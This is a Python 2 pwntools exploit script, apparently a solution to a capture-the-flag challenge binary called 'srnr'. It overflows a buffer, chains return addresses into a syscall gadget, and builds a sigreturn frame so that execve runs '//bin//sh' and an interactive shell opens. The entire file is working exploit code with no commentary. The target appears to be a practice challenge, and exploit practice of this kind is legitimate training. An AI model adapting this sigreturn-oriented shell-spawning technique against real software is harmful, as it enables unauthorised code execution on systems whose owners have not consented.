#!/usr/bin/env python2

from pwn import *

EXE_PATH = './srnr'
context.binary = EXE_PATH
e = ELF(EXE_PATH)
BIN_SH_ADDR = next(e.search('//bin//sh\x00'))
SYSCALL_ADDR = next(e.search(asm('syscall')))


def exploit():
    r = process(EXE_PATH)
    #gdb.attach(r)
    p = '0 {}'.format(int(constants.SYS_rt_sigreturn)).ljust(4096)
    r.send(p)
    p = 'A' * 0x11
    p += p64(0x004011eb)
    p += p64(e.symbols['get_int'])
    p += p64(SYSCALL_ADDR)
    frame = SigreturnFrame()
    frame.rip = SYSCALL_ADDR
    frame.rax = constants.SYS_execve
    frame.rdi = BIN_SH_ADDR
    frame.rsi = 0
    frame.rdx = 0
    p += str(frame)
    r.send(p)
    r.interactive()


if __name__ == '__main__':
    exploit()
